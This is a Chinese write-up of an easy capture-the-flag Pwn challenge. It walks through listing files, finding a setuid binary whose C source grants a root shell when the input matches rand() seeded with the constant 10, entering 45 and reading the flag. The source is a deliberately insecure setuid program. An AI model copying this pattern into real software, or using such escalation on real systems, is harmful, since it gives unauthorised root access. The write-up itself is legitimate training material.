# 没有权限的flag！

- 作者：pn1fg
- 参考：-
- 难度：Easy
- 分类：Pwn
- 镜像：[svuctf-helloworld-2023/suid](https://ghcr.io/svuctf/svuctf-helloworld-2023/suid)
- 端口：70

## 题目描述

flag就在这，你能拿到它嘛？

## 题目解析

@pn1fg 的思路，我（@13m0n4de）只负责实现。

本题考察 Pwn 的工具使用，以及 linux 系统基础命令和生成随机数

这题还是一样的套路，nc 连接容器后是一个 shell 终端

```shell
$ nc ip port
```

首先 ls 查看当前目录下有个flag 文件

```shell
/ $ ls
bin
dev
flag
lib
lib32
lib64
myapp
```

cat flag 提示我们权限不够

```shell
/ $ cat flag
cat: can't open 'flag': Permission denied
```

这时我们可以 ls -la 查看当前 flag 权限

```shell
/ $ ls -la
total 56
drwxr-x---    1 1000     1000          4096 Oct 22 11:18 .
drwxr-x---    1 1000     1000          4096 Oct 22 11:18 ..
drwxr-xr-x    1 0        0             4096 Oct 14 16:30 .secret
drwxr-xr-x    2 0        0             4096 Oct 14 16:30 bin
drwxr-xr-x    2 0        0             4096 Oct 14 16:30 dev
-r--------    1 0        0               43 Oct 22 11:38 flag
drwxr-xr-x    1 0        0             4096 Oct 14 16:30 lib
drwxr-xr-x    2 0        0             4096 Oct 14 16:30 lib32
drwxr-xr-x    1 0        0             4096 Oct 14 16:30 lib64
-rwsr-sr-x    1 0        0            16408 Oct 14 16:29 myapp
```

id 查看我们当前用户权限

```shell
/ $ id
uid=1000 gid=1000 groups=1000
```

发现我们当前用户并没有读取 flag 的权限，我们需要更高权限的用户，首先想到的方法就是提权，仔细观察当前目录下还有个可执行程序 myapp ，它拥有 sudo 权限，我们可以通过执行它获取更高的权限

执行 myapp

```shell
/ $ ./myapp
Please Input Your Number:
1
HACKER!!!
```

提示我们输入一个数，我们随便输个 1 ，返回了一个字符串

此时我们再次 id 查看当前用户权限

```shell
/ $ id
uid=1000 gid=1000 groups=1000
```

发现用户权限并没有改变，说明提权失败

回想刚刚 ls -la 时，当前目录下有个 `.secret`的隐藏文件夹，联想到上一题的 flag 就藏在里面，我们也进入 `.ssecret`下查看一下

```shell
/ $ cd .secret
/.secret $ ls
myapp.c
```

发现这个文件夹中放着刚刚 myapp 的 C 语言源码

果断查看源码

```c
/.secret $ cat myapp.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void init() {
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

int main() {
    int v1,v2;

    init();
    srand(10);
    v1 = rand() % 50;
    puts("Please Input Your Number:");
    scanf("%d", &v2);

    if (v2 == v1) {
        setuid(0);
        system("/bin/sh");
    } else {
        puts("HACKER!!!");
    }

    return 0;
}
```

仔细阅读源码，发现这个程序在生成随机数，我们只需猜出它生成的随机数就可以成功提权，有 C 语言基础的同学们可以一眼看出本题的随机数是固定的，因为它的随机数种子是固定的并且告诉了我们，所以我们只需要在本地写一个 C 程序，运行出这个随机数为 45。

再次执行 myapp

```shell
/ $ ./myapp
Please Input Your Number:
45

id
uid=0 gid=1000 egid=0 groups=1000
```

再次执行输入 45 后发现没有回显，此时 id 查看当前用户权限为最高权限

获取 flag

```shell
cat f*
flag{8b612fd0-d084-49eb-927f-47b72bd29b95}
```
